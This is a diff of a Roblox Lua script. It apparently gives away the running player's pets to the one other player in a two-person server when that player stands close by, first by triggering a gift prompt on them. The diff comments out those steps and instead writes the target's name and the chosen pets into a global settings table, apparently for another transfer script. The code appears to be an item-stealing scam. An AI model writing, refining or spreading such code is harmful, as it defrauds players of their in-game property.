@@ -127,10 +127,11 @@ task.spawn(function()
                 isSystemActive = false
                 pcall(function()
                     for _, pet in ipairs(gift_petlist) do
+                        --[[
                         LocalPlayer.Character.Humanoid:EquipTool(pet)
                         if pet:GetAttribute("d") then
                             ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
-                        end
+                        end]]
                         local targetplayer
                         if #(Players:GetChildren()) ~= 2 then return end
                         for _, v in ipairs(Players:GetChildren()) do
@@ -143,6 +144,13 @@ task.spawn(function()
                             local targetHumanoidRootPart = targetplayer.Character.HumanoidRootPart
                             local targetPos = targetHumanoidRootPart.Position
                             if (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude > 10 then return end
+                            _G.Settings = {
+                                ['USERNAME'] = {
+                                targetplayer.Name
+                            },
+                                ['PET_SELECT'] = havePET
+                            }
+                            --[[
                             task.wait(0.25)
                             local prompt = targetHumanoidRootPart and targetplayer.Character.Head:FindFirstChild('ProximityPrompt')
                             if prompt then
@@ -151,11 +159,17 @@ task.spawn(function()
                                 prompt:InputHoldBegin()
                                 prompt:InputHoldEnd()
                                 task.wait(2)
-                            end
+                            end]]
+                            task.wait(2)
                         end
                     end
                 end)
             end
+
+            _G.Settings = {
+                ['USERNAME'] = {},
+                ['PET_SELECT'] = nil
+            }
 
         end)
     end
